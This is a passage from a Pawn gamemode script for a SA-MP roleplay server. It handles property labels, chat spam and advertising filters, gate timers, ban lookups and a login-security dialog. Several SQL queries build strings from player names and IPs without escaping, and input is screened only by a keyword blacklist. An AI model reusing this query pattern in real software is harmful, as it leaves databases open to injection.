			HouseLabel[h] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
			DestroyDynamicPickup(HousePickup[h]);
			HousePickup[h] = CreateDynamicPickup(1273, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]);
		}
		else if(HouseInfo[h][hOwned] == 1)
		{
			new tenants=0,query[256];
			format(query, sizeof(query), "SELECT * FROM `users` WHERE `Rented` = '%d'", h);
			new Cache: membresult = mysql_query(SQL, query);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				tenants++;
			}
			cache_delete(membresult);
			if(HouseInfo[h][hRentabil] == 1)
			{
				DestroyDynamic3DTextLabel(HouseLabel[h]);
				format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {0066FF}%d \n{0066FF}%s \n{FFFFFF}Owner: {0066FF}%s \n{FFFFFF}Tenants: {0066FF}%d \n{FFFFFF}Rent: {0066FF}$%s \n{FFFFFF}Level: {0066FF}%d \n{0066FF}To rent a room type /rentroom",h,HouseInfo[h][hDiscription],HouseInfo[h][hOwner],tenants,FormatNumber(HouseInfo[h][hRent]),HouseInfo[h][hLevel]);
				HouseLabel[h] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
				DestroyDynamicPickup(HousePickup[h]);
				HousePickup[h] = CreateDynamicPickup(1272, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]);
			}
			else
			{
				DestroyDynamic3DTextLabel(HouseLabel[h]);
				format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {0066FF}%d \n{0066FF}%s \n{FFFFFF}Owner: {0066FF}%s \n{FFFFFF}Tenants: {0066FF}%d \n{FFFFFF}Level: {0066FF}%d",h,HouseInfo[h][hDiscription],HouseInfo[h][hOwner], tenants, HouseInfo[h][hLevel]);
				HouseLabel[h] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
				DestroyDynamicPickup(HousePickup[h]);
				HousePickup[h] = CreateDynamicPickup(1272, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]);
			}
		}
	}
	else if(update == 2)
	{
		if(BizzInfo[h][bOwned] == 0)
		{
			DestroyDynamic3DTextLabel(BizzLabel[h]);
			format(PropertyString, sizeof(PropertyString),"{357AB7}%s \n{FFFFFF}Business {357AB7}#%d \n{357AB7}This Business is for sale(/buybiz) ! \n {FFFFFF}Price: {357AB7}%s \n{FFFFFF}Level: {357AB7}%d",BizzInfo[h][bMessage],h,FormatNumber(BizzInfo[h][bBuyPrice]),BizzInfo[h][bLevelNeeded]);
			BizzLabel[h] = CreateDynamic3DTextLabel(PropertyString ,0x0066FFCC,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
		}
		else if(BizzInfo[h][bOwned] == 1)
		{
			DestroyDynamic3DTextLabel(BizzLabel[h]);
			format(PropertyString, sizeof(PropertyString),"{357AB7}%s \n{FFFFFF}Business {357AB7}#%d \n{FFFFFF}Owner: {357AB7}%s \n{FFFFFF}Fee: {357AB7}$%s",BizzInfo[h][bMessage],h,BizzInfo[h][bOwner],FormatNumber(BizzInfo[h][bEntranceCost]),BizzInfo[h][bLevelNeeded]);
			BizzLabel[h] = CreateDynamic3DTextLabel(PropertyString ,0x0066FFCC,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
		}
	}
	return 1;
}

stock Carspeed(playerid)
{
    new Float:Speed[3];
    GetVehicleVelocity(GetPlayerVehicleID(playerid),Speed[0],Speed[1],Speed[2]);
    return floatround(1.61*floatsqroot(floatpower(floatabs(Speed[0]), 2.0) + floatpower(floatabs(Speed[1]), 2.0) + floatpower(floatabs(Speed[2]), 2.0)) * 99.38);
}

AntiFlood_Check( playerid, bool:inc=true )
{
	AntiFlood_Data[playerid][floodRate] += inc ? RATE_INC : 0;
	AntiFlood_Data[playerid][floodRate] = AntiFlood_Data[playerid][floodRate] - ( GetTickCount() - AntiFlood_Data[playerid][lastCheck] );
	AntiFlood_Data[playerid][lastCheck] = GetTickCount();
	AntiFlood_Data[playerid][floodRate] = AntiFlood_Data[playerid][floodRate] < 0 ? 0 : AntiFlood_Data[playerid][floodRate];

	if ( AntiFlood_Data[playerid][floodRate] >= RATE_MAX )
	{
		#if THRESOLD_ACTION == 1
			SendClientMessage(playerid,COLOR_ERROR,"{FF6347}Kick: You got kicked because you did spam.");
			Kick(playerid);
		#elseif THRESOLD_ACTION == 2
			SendClientMessage(playerid,COLOR_ERROR,"{FF6347}Kick: You got kicked because you did spam.");
			Kick(playerid);
		#else
			SendClientMessage(playerid, COLOR_ERROR, "Please stop spam." );
		#endif

		return false;
	}

	return true;
}

AntiFlood_InitPlayer( playerid )
{
	AntiFlood_Data[playerid][lastCheck] = GetTickCount();
	AntiFlood_Data[playerid][floodRate] = 0;
}

public OnPlayerText(playerid, text[])
{
	if(TutTime[playerid] >= 1 || RegistrationStep[playerid] >= 1) return 0;
    new string[256];
	///----- Anti SPAM -----///
	if(text[0] && !strcmp (text, LastText[playerid]) && LastTextTime[playerid] > GetTickCount () && PlayerInfo[playerid][pAdmin] < 1) return 0;
    LastTextTime[playerid] = GetTickCount() + SECONDS_BETWEEN_SAME_MSGS * 1000;
	strcpy(LastText[playerid], text, 128);
	///----- Anti SPAM -----///
	///----- CHAT LOGS -----///
	new result3[300];
	if(Mobile[playerid] != -1)
	{
		format(result3, sizeof(result3),"(cellphone) %s",text);
	}
	else
	{
		format(result3, sizeof(result3),"%s",text);
	}
	///----- CHAT LOGS -----///
    if(FindIP(text)) /// Anti-Reclame a
    {
        new advertiser[MAX_PLAYER_NAME];
        GetPlayerName(playerid, advertiser, sizeof(advertiser));
        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in chat.", advertiser, playerid, text);
		ABroadCast(COLOR_SERVER,string,1);
    }
    for(new i; i < sizeof(TLD); i++)
	{
		if(strfind(text, TLD[i], true) != -1)
		{
			if(strfind(text, "wwww.Magic-Gaming.tk", true) != -1 || strfind(text, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(text, "Magic-Gaming.tk", true) != -1) break;
			new advertiser[MAX_PLAYER_NAME];
			GetPlayerName(playerid, advertiser, sizeof(advertiser));
			format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in chat.", advertiser, playerid, text);
			ABroadCast(COLOR_SERVER,string,1);
		}
	}

	new sendername[MAX_PLAYER_NAME];
	new tmp[256];
	format(string, sizeof(string), "\"%s\"", text);
	SetPlayerChatBubble(playerid, text, COLOR_CHATBUBBLE, 10.0, 10000);
    if(PlayerInfo[playerid][pMuted] == 1)
    {
	    format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
	    SendClientMessage(playerid, COLOR_ERROR, string);
		return 0;
	}
	assert(AntiFlood_Check(playerid));
	if(Answered == 0)
	{
	    new idx;
	    tmp = strtok(text, idx);
		if ((strcmp(FastString, tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen(FastString)))
		{
		    new money = random(19000) + 1000;
			Answered = 1;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Fast Event: {FFFFFF}%s He won fast-event and received $%s!", sendername, FormatNumber(money));
			OOCNews(COLOR_ERROR, string);
			GivePlayerCash(playerid, money);
			return 0;
		}
	}
	if(TalkingLive[playerid] != 0)
	{
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pMember] == 9)
		{
		    format(string, sizeof(string), "NR %s: %s", sendername, text);
			OOCNews(COLOR_LIGHTGREEN, string);
		}
		else
		{
		    format(string, sizeof(string), "LivePlayer %s: %s", sendername, text);
			OOCNews(COLOR_LIGHTGREEN, string);
		}
		return 0;
	}
	if(Mobile[playerid] != -1)
	{
		new idx;
		tmp = strtok(text, idx);
		GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string, sizeof(string), "(cellphone) %s: %s", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		if(IsPlayerConnected(Mobile[playerid]))
		{
		    if(Mobile[Mobile[playerid]] == playerid)
		    {
				if(PlayerInfo[Mobile[playerid]][pSpeaker] == 1)
				{
					ProxDetector(20.0, Mobile[playerid], string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				}
				else
				{
				    SendClientMessage(Mobile[playerid], COLOR_YELLOW,string);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_YELLOW,"Theres nobody there");
		}
		format(string, sizeof(string), "(cellphone) \"%s\"", text);
		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
		return 0;
	}
	if (realchat)
	{
		if(gPlayerLogged[playerid] == 0)
		{
			return 0;
		}
		//GetPlayerName(playerid, sendername, sizeof(sendername));
		//format(string, sizeof(string), "%s: %s", sendername, text);
		//ProxDetector(20.0, playerid,string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);

		new szMessage[1000];
		new szPlayerName[32];
		GetPlayerName(playerid, szPlayerName, 32);
		new inpaint = 0;
		if(PlayerInfo[playerid][pPaintBallG] > 0)
		{
			format(szMessage,sizeof(szMessage),"{D99393}%s [%d killing]{FFFFFF}: %s",szPlayerName,PlayerInfo[playerid][pPaintBallKills],text);
			foreach(Player, idd)
			{
					if(PlayerInfo[idd][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
					{
						SendClientMessage(idd, COLOR_SERVER, szMessage);
					}
			}
			inpaint = 1;
		}
		else
		{
			if(PlayerInfo[playerid][pColor] == 0)
			{
				format(szMessage, sizeof(szMessage), "{CECECE}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 1)
			{
				format(szMessage, sizeof(szMessage), "{4169E1}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 2)
			{
				format(szMessage, sizeof(szMessage), "{662BBE}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 3)
			{
				format(szMessage, sizeof(szMessage), "{FFE600}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 4)
			{
				format(szMessage, sizeof(szMessage), "{FF00FF}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 5)
			{
				format(szMessage, sizeof(szMessage), "{3FFF3F}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 6)
			{
				format(szMessage, sizeof(szMessage), "{83D553}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 7)
			{
				format(szMessage, sizeof(szMessage), "{187700}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 8)
			{
				format(szMessage, sizeof(szMessage), "{FF9A00}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 9)
			{
				format(szMessage, sizeof(szMessage), "{222222}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 10)
			{
				format(szMessage, sizeof(szMessage), "{FF2C9D}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 11)
			{
				format(szMessage, sizeof(szMessage), "{8000FF}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 12)
			{
				format(szMessage, sizeof(szMessage), "{00FFEE}%s:{FFFFFF} %s", szPlayerName, text);
			}
			else if(PlayerInfo[playerid][pColor] == 13)
			{
				format(szMessage, sizeof(szMessage), "{FF0000}%s:{FFFFFF} %s", szPlayerName, text);
			}
			if(PlayerInfo[playerid][pHelper] >= 1) format(szMessage, sizeof(szMessage), "{FF8000}%s:{FFFFFF} %s", szPlayerName, text);
			if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pColor] < 1) format(szMessage, sizeof(szMessage), "{AB0000}%s:{FFFFFF} %s", szPlayerName, text);
		}
		//MESSAGE SPLIT
		if(inpaint == 0)
		{
			new len = strlen(szMessage),
				_iL = len / EX_SPLITLENGTHH;
			if( ( len % EX_SPLITLENGTHH ) ) _iL++;
			new _Line[EX_SPLITLENGTHH+5];
			new _:_i@Index;
			while( _i@Index < _iL )
			{
				if( _i@Index == 0 )
					strmid( _Line, szMessage, ( _i@Index * EX_SPLITLENGTHH ), ( _i@Index * EX_SPLITLENGTHH ) + EX_SPLITLENGTHH );
				else
					strmid( _Line, szMessage, ( _i@Index * EX_SPLITLENGTHH ), ( _i@Index * EX_SPLITLENGTHH ) + EX_SPLITLENGTHH );

				if( _iL > 1 )
				{
					if( _i@Index > 0 )
					{
						format( _Line, sizeof _Line, "... %s", _Line );
					}
				}
				ProxDetector(20.0, playerid, _Line, COLOR_SERVER,COLOR_SERVER,COLOR_SERVER,COLOR_SERVER,COLOR_SERVER);
				_i@Index++;
			}
			format(szMessage, sizeof(szMessage), "\"%s\"", text);
			SetPlayerChatBubble(playerid, szMessage, COLOR_CHATBUBBLE, 15.0, 10000);
		}	
		return 0;
	}
	return 1;
}

public FixHour(hour)
{
	hour = timeshift+hour;
	if (hour < 0)
	{
		hour = hour+24;
	}
	else if (hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}
public UnFreezeStation(playerid)
{
    PlayerTextDrawHide(playerid, Bus1[playerid]);
    PlayerTextDrawHide(playerid, Bus2[playerid]);
	TogglePlayerControllable(playerid, 1);
	return 1;
}

public Fisher2(playerid)
{
	Fishing[playerid] = 0;
	SCM(playerid,COLOR_SERVER,"{999999}Now you can fish again.");
	return 1;
}

public RespawnTruck(playerid)
{
    if(!IsVehicleOccupied(TruckID[playerid]))
    {
		SetVehicleToRespawn(TruckID[playerid]);
		TruckID[playerid] = 0;
	}
	else
	{
	    TruckID[playerid] = 0;
	}
	DisablePlayerCheckpoint(playerid);
	DestroyVehicle(viddd[playerid]);
	viddd[playerid] = 0;
	Trucker[playerid] = 0;
	KillTimer(restruck[playerid]);
}

public TowAgain(playerid)
{
	TowAcc[playerid] = 0;
	SCM(playerid,COLOR_GREY,"Job reload time ended.");
	return 1;
}
public gateadminclose()
{
    MoveObject(gatehqa, 907.50238, -1666.58813, 13.40640, 2, 0.00000, -91.00000, -90.00000);
    return 1;
}
public lspdgateclose()
{
    MoveObject(gatelspd, 1592.67676, -1638.05225, 14.95110, 1.5, -1000.0, -1000.0, -1000.0);
    return 1;
}

public lvpdgateclose()
{
    MoveDynamicObject(gatelvpd, 2334.8999000, 2444.3999000, 8.3000000, 1.5, -1000.0, -1000.0, -1000.0);
    return 1;
}

public lvpdgateclose2()
{
    MoveDynamicObject(gatelvpd2, 2294.2000000, 2499.1001000, 5.7000000, 1.5, -1000.0, -1000.0, -1000.0);
    return 1;
}

public nggateclose()
{
    MoveDynamicObject(gateng, 135.2833, 1941.3331, 21.6932, 1.5, -1000.0, -1000.0, -1000.0);
    return 1;
}
public lspdbarclose()
{
    MoveDynamicObject(lspdbar, 1544.7007, -1630.7527, 13.2983, 1.5,0.0000, 90.0200, 90.0000);
    return 1;
}
public lvpdbarclose()
{
    MoveDynamicObject(lvpdbar, 2238.22021, 2450.44312, 10.58781, 1.5,0.0000, 90.0200, 90.0000);
    return 1;
}
stock strvalEx( const string[] )
{
   if( strlen( string ) >= 50 ) return 0;
   return strval(string);
}

public UnsetAfterTutorial(playerid)
{
	if(IsPlayerConnected(playerid))
	{
        AfterTutorial[playerid] = 0;
	}
	return 1;
}

public BackupClear(playerid, calledbytimer)
{
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 1)
		{
			if (PlayerInfo[playerid][pRequestingBackup] == 1)
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(IsACop(i))
						{
							CP[i] = 0;
							DisablePlayerCheckpoint(i);
						}
					}
				}
				if (calledbytimer != 1)
				{
					SendClientMessage(playerid, TEAM_BLUE_COLOR, "Your backup request has been cleared.");
				}
				else
				{
					SendClientMessage(playerid, TEAM_BLUE_COLOR, "Your backup request has been cleared automatically.");
				}
				PlayerInfo[playerid][pRequestingBackup] = 0;
			}
			else
			{
				if (calledbytimer != 1)
				{
					SendClientMessage(playerid, COLOR_DARKNICERED, "You don't have an active backup request!");
				}
			}
		}
		else
		{
			if (calledbytimer != 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "You are not a cop!");
			}
		}
	}
	return 1;
}

public OnVehicleDeath(vehicleid)
{
 	new engine,lights,alarm,doors,bonnet,boot,objective;
 	vehEngine[vehicleid] = 0;
	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
 	SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
    if(IsAnOwnableCar(vehicleid))
 	{
        if(CarInfo[OwnedVeh(vehicleid)][cOwned]==1)
        {
            CarInfo[OwnedVeh(vehicleid)][cTimed] += 1;
            CarInfo[OwnedVeh(vehicleid)][cInscarprice] += 15;
			CarInfo[OwnedVeh(vehicleid)][cHP] += 1000.0;
     	 	if(CarInfo[OwnedVeh(vehicleid)][cInsurancecar] != 0)
     	 	{
             	CarInfo[OwnedVeh(vehicleid)][cInsurancecar]--;
    	 	}
	    	vUpdate(OwnedVeh(vehicleid), cTimedx);
			vUpdate(OwnedVeh(vehicleid), cInscarpricex);
			vUpdate(OwnedVeh(vehicleid), cInsurancecarx);
			vUpdate(OwnedVeh(vehicleid), cKMx);
			vUpdate(OwnedVeh(vehicleid), cHPx);
		}
 	}
 	if(Destroycar == 1)
 	{
		if(Carspawn[vehicleid] != 0)
		{
			DestroyVehicle(Carspawn[vehicleid]);
			Carspawn[vehicleid] = 0;
		}
	}
	StopAudioStreamForPlayersInCar(vehicleid);
	RepairVehicle(vehicleid);
 	return 1;
}

public Float:GetDistance(playerid, Float:x, Float:y)
{
	new Float:x2, Float:y2, Float:z2;
	GetPlayerPos(playerid, x2, y2, z2);
	x = x - x2;
	y = y - y2;
	return floatsqroot(x*x+y*y);
}

stock BanCheck(playerid)
{
	new playername[30],name[30],playerip[16],admin[30],reason[128],ip[16],permanent,string[256],qstr[612],ipban,time,date[6];
	GetPlayerName(playerid, playername, sizeof(playername));
	GetPlayerIp(playerid, playerip, sizeof(playerip));
	format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `PlayerName`='%s' AND `Active`='1'",playername);
    new Cache: banuri = mysql_query(SQL,qstr);
    if(cache_get_row_count() > 0)
    {
        cache_get_field_content(0, "PlayerName", name, SQL, 30);
		cache_get_field_content(0, "AdminName", admin, SQL, 30);
		cache_get_field_content(0, "Reason", reason, SQL, 128);
    	cache_get_field_content(0, "IP", ip, SQL, 16);
    	permanent                    	= cache_get_field_content_int(0, "Permanent");
    	ipban                           = cache_get_field_content_int(0, "IPBan");
    	time                            = cache_get_field_content_int(0, "Time");

		if(ipban == 0)
		{
		    if(gettime() < time || permanent > 0)
		    {
		        if(permanent > 0)
		        {
		            format(string,sizeof(string),"This account (%s) is banned!",playername);
		    		SendClientMessage(playerid, COLOR_RED, string);
		    		format(string,sizeof(string),"Banned by: %s, reason: %s.",admin,reason);
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, "This is a permanent ban.");
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, "You can post a request to unban the http://ucp.t-zone.ir if you think you got money for nothing.");
            		GameTextForPlayer(playerid, "Banned", 5000, 2);
					KickEx(playerid);
				}
				else
				{
			    	format(string,sizeof(string),"This account (%s) is banned!",playername);
			    	SendClientMessage(playerid, COLOR_RED, string);
			    	format(string,sizeof(string),"Banned by: %s, reason: %s.",admin,reason);
			    	SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
	   				TimestampToDate(time,date[0],date[1],date[2],date[3],date[4],date[5],2);
	   				format(string,sizeof(string),"Ban will expire on %02d.%02d.%02d-%02d:%02d:%02d.",date[2],date[1],date[0],date[3],date[4],date[5]);
	   				SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
	   				SendClientMessage(playerid, COLOR_GENANNOUNCE, "You can post a request to unban the http://ucp.t-zone.ir if you think you got money for nothing.");
	            	GameTextForPlayer(playerid, "Banned", 5000, 2);
					KickEx(playerid);
				}
			}
			else
			{
		    	new str2[128];
		    	mysql_format(SQL, str2, sizeof(str2), "UPDATE bans SET `Active`='0' WHERE `PlayerName`='%s'",name);
      			mysql_tquery(SQL,str2,"","");
      			IPBanCheck(playerid);
			}
		}
		else
		{
		    IPBanCheck(playerid);
		}
	}
	else
	{
		IPBanCheck(playerid);
	}
	cache_delete(banuri);
	return 1;
}

stock IPBanCheck(playerid)
{
	new name[30],playerip[16],admin[30],reason[128],ip[16],permanent,string[256],qstr[612],ipban,time,date[6];
	GetPlayerIp(playerid, playerip, sizeof(playerip));
	format(qstr,sizeof(qstr),"SELECT * FROM bans WHERE `IP`='%s' AND `Active`='1'",playerip);
    new Cache: banuri = mysql_query(SQL,qstr);
    if(cache_get_row_count() > 0)
    {
        cache_get_field_content(0, "PlayerName", name, SQL, 30);
		cache_get_field_content(0, "AdminName", admin, SQL, 30);
		cache_get_field_content(0, "Reason", reason, SQL, 128);
    	cache_get_field_content(0, "IP", ip, SQL, 16);
    	permanent                    	= cache_get_field_content_int(0, "Permanent");
    	ipban                           = cache_get_field_content_int(0, "IPBan");
    	time                          	= cache_get_field_content_int(0, "Time");

		if(ipban == 1)
		{
			if(gettime() < time || permanent > 0)
			{
			    if(permanent > 0)
				{
		    		format(string,sizeof(string),"This IP (%s) is banned!",playerip);
		    		SendClientMessage(playerid, COLOR_RED, string);
		    		format(string,sizeof(string),"Banned by: %s, reason: %s.",admin,reason);
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, "This is a permanent ban.");
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, "You can post a request to unban the http://ucp.t-zone.ir if you think you got money for nothing.");
            		GameTextForPlayer(playerid, "Banned", 5000, 2);
					KickEx(playerid);
				}
				else
				{
		    		format(string,sizeof(string),"This IP (%s) is banned!",playerip);
		    		SendClientMessage(playerid, COLOR_RED, string);
		    		format(string,sizeof(string),"Banned by: %s, reason: %s.",admin,reason);
		    		SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
					TimestampToDate(time,date[0],date[1],date[2],date[3],date[4],date[5],2);
	   				format(string,sizeof(string),"Ban will expire on %02d.%02d.%02d-%02d:%02d:%02d.",date[2],date[1],date[0],date[3],date[4],date[5]);
	   				SendClientMessage(playerid, COLOR_GENANNOUNCE, string);
   					SendClientMessage(playerid, COLOR_GENANNOUNCE, "You can post a request to unban the http://ucp.t-zone.ir if you think you got money for nothing.");
            		GameTextForPlayer(playerid, "Banned", 5000, 2);
					KickEx(playerid);
				}
			}
			else
			{
		    	new str2[128];
		    	mysql_format(SQL, str2, sizeof(str2), "UPDATE bans SET `Active`='0' WHERE `IP`='%s'",ip);
      			mysql_tquery(SQL,str2,"","");
      			// PLAYER LOGIN
				new pnamee[25];
				GetPlayerName(playerid, pnamee, sizeof(pnamee));
				format(qstr,sizeof(qstr),"SELECT * FROM users WHERE `name`='%s'",pnamee);
				new Cache: abcd = mysql_query(SQL,qstr);
				if(cache_get_row_count() > 0)
				{
					gPlayerAccount[playerid] = 1;
				}
				else
				{
					gPlayerAccount[playerid] = 0;
				}
				cache_delete(abcd);
			}
		}
		else
		{
   			// PLAYER LOGIN
			new pnamee[25];
			GetPlayerName(playerid, pnamee, sizeof(pnamee));
			format(qstr,sizeof(qstr),"SELECT * FROM users WHERE `name`='%s'",pnamee);
			new Cache: abcd = mysql_query(SQL,qstr);
			if(cache_get_row_count() > 0)
			{
				gPlayerAccount[playerid] = 1;
			}
			else
			{
				gPlayerAccount[playerid] = 0;
			}
			cache_delete(abcd);
		}
	}
	else
	{
		// PLAYER LOGIN
		new pnamee[25];
		GetPlayerName(playerid, pnamee, sizeof(pnamee));
		format(qstr,sizeof(qstr),"SELECT * FROM users WHERE `name`='%s'",pnamee);
		new Cache: abcd = mysql_query(SQL,qstr);
		if(cache_get_row_count() > 0)
		{
			gPlayerAccount[playerid] = 1;
		}
		else
		{
			gPlayerAccount[playerid] = 0;
		}
		cache_delete(abcd);
	}
	cache_delete(banuri);
	return 1;
}

stock IsMonth31(month)
{
 	switch (month)
	{
	    case 1: return 1;
	    case 3: return 1;
	    case 5: return 1;
	    case 7: return 1;
	    case 8: return 1;
	    case 10: return 1;
	    case 12: return 1;
	    default: return 0;
	}
	return 0;
}

stock IsMonth29(year)
{
 	new y = 2000;
 	for(new i = 4; i < 3000; i += 4) if ((y+i) == year) return 1;
 	return 0;
}

stock strtok2(const string[], &idx)
{
    new length = strlen(string);
	while ((idx < length) && (string[idx] <= ' '))
	{
		idx++;
	}
	new offset = idx;
	new result[128];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
		result[idx - offset] = string[idx];
		idx++;
	}
	result[idx - offset] = EOS;
	return result;
}
stock GetWeaponNameByID(wid)
{
	new gunname[64];
	switch (wid)
	{
		case 	1 .. 17, 
				22 .. 43, 
				46 : 		GetWeaponName(wid,gunname,sizeof(gunname));
		case 	0:			format(gunname,32,"%s","Fist");
		case 	18:			format(gunname,32,"%s","Molotov Cocktail");
		case 	44:			format(gunname,32,"%s","Night Vis Goggles");
		case 	45:			format(gunname,32,"%s","Thermal Goggles");
		default:			format(gunname,32,"%s","Invalid Weapon Id");
	
	}
	return gunname;
}
// OnDialogResponse
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    new vehicleid = GetPlayerVehicleID(playerid);
	new sendername[25];
	new string[300];
	for(new i; i < sizeof(antisqlinjection); i++)
	{
	    if(dialogid != DIALOG_CLAN_TAG && dialogid != DIALOG_UPDATES)
	    {
   		    if(strfind(inputtext, antisqlinjection[i], true) != -1)
			{
				SCM(playerid, COLOR_ERROR, "Nu sunt permise asemenea caractere.");
				return 1;
   			}
   		}
	}
	if(dialogid == DIALOG_NCOLORS)
	{
		if(!response) return 1;
		PlayerInfo[playerid][pColors] = listitem+2;
		Update(playerid, pColorsx);
		SCM(playerid, -1, "Culoarea ti-a fost setata la nickname.");
		SetPlayerToTeamColor(playerid);
	}
	if(dialogid == DIALOG_BSECURITATE+2)
	{
		new numaicontinua = 0;
		if(!response) { KickEx(playerid); numaicontinua = 1; }
		if(response)
		{
			if(strlen(inputtext) < 8) { KickEx(playerid); numaicontinua = 1; }
			if(strcmp(inputtext, codacces[playerid], true) == 0 && numaicontinua == 0)
			{
				problemalogin[playerid] = -1;
				new sqlupdate[1000];
				SCM(playerid, COLOR_YELLOW, "The code entered is correct, I hate a game type platet!");
				new ip[16];
				GetPlayerIp(playerid, ip, 16);
				new clasaip[64];
				strdel(ip, 8, strlen(ip));
				format(clasaip, sizeof(clasaip), "%s",ip);
				strcpy(PlayerInfo[playerid][pNrTel], inputtext, 200);
				mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `ClasaIPTel` = '%s' WHERE `id`='%d'",clasaip, PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, sqlupdate, "", "");
				if(strlen(PlayerInfo[playerid][pCuvant]) > 4 && strlen(PlayerInfo[playerid][pCuvant]) < 21)
				{
					SelectTextDraw(playerid, 0xFF0000FF);
					Securitate[playerid] = 1;
					gPlayerLogged[playerid] = 0;
					securitatenr[playerid] = 1;
					PlayerTextDrawSetString(playerid, SecuritateTD[playerid][5], "Introdu_parola_contului...");
					PlayerTextDrawSetString(playerid, SecuritateTD[playerid][6], "Introdu_cuvantul_cheie...");
					timercuvantcheie[playerid] = 60;
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][0]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][1]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][2]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][3]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][4]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][5]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][6]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][7]);
					PlayerTextDrawShow(playerid, SecuritateTD[playerid][8]);
				}
			}
			else
			{
				KickEx(playerid);
			}
		}	
	}
	if(dialogid == DIALOG_BSECURITATE)
	{
		if(!response) return 1;
		if(response)
		{
